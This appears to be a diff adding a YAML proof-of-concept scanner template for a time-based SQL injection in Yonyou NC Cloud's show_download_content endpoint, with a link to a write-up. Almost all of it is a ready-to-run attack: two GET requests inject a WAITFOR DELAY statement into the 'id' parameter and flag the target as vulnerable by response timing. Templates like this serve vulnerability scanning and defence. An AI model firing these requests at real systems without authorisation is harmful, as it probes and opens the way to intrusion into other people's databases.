@@ -1,0 +1,28 @@
+name: poc-yaml-yongyouNC-Cloud-show_download_content-sql
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /ebvp/infopub/show_download_content;.js?id=1';WAITFOR+DELAY+'0:0:4'--
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+    expression: response.latency >= 4000 && response.latency <= 5000
+  r1:
+    request:
+      method: GET
+      path: /ebvp/infopub/show_download_content;.js?id=1';WAITFOR+DELAY+'0:0:8'--
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+    expression: response.latency >= 8000 && response.latency <= 9000
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487215&idx=1&sn=ee83124f6ab762537497ef55f1639001&chksm=c267bbdcf51032ca2b2ff4e1d56577be9caddfa3e7933eb570af312b56951ef18ade005bd62c&token=101124693&lang=zh_CN#rd
+
+
+
